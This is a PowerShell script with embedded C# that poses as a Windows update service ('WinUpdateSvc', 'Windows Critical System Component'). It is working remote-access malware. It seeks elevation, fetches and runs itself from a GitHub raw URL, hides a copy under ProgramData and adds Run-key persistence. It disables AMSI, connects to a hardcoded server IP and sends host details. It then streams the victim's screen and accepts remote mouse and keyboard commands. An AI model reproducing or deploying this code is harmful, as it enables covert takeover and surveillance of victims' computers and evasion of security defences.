<#
.SYNOPSIS
Windows Critical System Component
#>

$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
} catch {}
attrib +h +s +r $scriptPath 2>$null

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool ClipCursor(IntPtr lpRect);
        [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
        [DllImport("user32.dll")] public static extern bool ClipCursor(ref RECT lpRect);

        static string IP;
        static int PORT;
        static TcpClient client;
        static NetworkStream stream;
        static StreamReader reader;
        static StreamWriter writer;
        static bool streaming = false;
        static object writeLock = new object();

        // Fila inteligente de mouse (evita lag e mouse fantasma)
        static int targetX = -1, targetY = -1;
        static bool hasNewPos = false;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            while (true) {
                try {
                    client = new TcpClient();
                    client.Connect(IP, PORT);
                    client.NoDelay = true;
                    stream = client.GetStream();
                    reader = new StreamReader(stream, new UTF8Encoding(false));
                    writer = new StreamWriter(stream, new UTF8Encoding(false));
                    writer.AutoFlush = true;

                    Send("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(ReadLoop); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start(); // Thread dedicada ao mouse

                    while (client.Connected) Thread.Sleep(1000);
                } catch { Thread.Sleep(3000); }
            }
        }

        static void Send(string msg) {
            try { lock (writeLock) { writer.WriteLine(msg); } } catch {}
        }

        static void ReadLoop() {
            try {
                while (client.Connected) {
                    if (stream.DataAvailable) {
                        string cmd = reader.ReadLine();
                        if (cmd != null) ProcessCommand(cmd.Trim());
                    } else { Thread.Sleep(5); }
                }
            } catch {}
        }

        static void InputLoop() {
            while (true) {
                if (hasNewPos) {
                    try {
                        int px = (int)((targetX / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                        int py = (int)((targetY / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                        Cursor.Position = new Point(px, py);
                    } catch {}
                    hasNewPos = false;
                }
                Thread.Sleep(10); // Executa a 100Hz (super rápido)
            }
        }

        static void StreamLoop() {
            while (true) {
                try {
                    if (streaming && client.Connected) {
                        string b64 = CaptureScreen(1280, 40); // Aumentado para 1280 e qualidade 40
                        if (b64 != null) Send("SCREEN:" + b64);
                        Thread.Sleep(30); // 33 FPS de tela
                    } else { Thread.Sleep(50); }
                } catch { Thread.Sleep(1000); }
            }
        }

        static void ProcessCommand(string cmd) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
                if (cmd == "exit") { Environment.Exit(0); }
                
                if (cmd == "lock_mouse") {
                    RECT rect = new RECT(); rect.Left = 0; rect.Top = 0;
                    rect.Right = Screen.PrimaryScreen.Bounds.Width; rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
                    ClipCursor(ref rect); Send("MOUSE_LOCKED"); return;
                }
                if (cmd == "unlock_mouse") { ClipCursor(IntPtr.Zero); Send("MOUSE_UNLOCKED"); return; }
                if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
                if (cmd == "ping") { Send("PONG"); return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    targetX = int.Parse(p[1]);
                    targetY = int.Parse(p[2]);
                    hasNewPos = true; // Avisa a Thread de Input que há nova posição
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        ImageCodecInfo codec = null;
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }
    }
"@
}

[R9KAgent]::Start($serverIP, $serverPort)
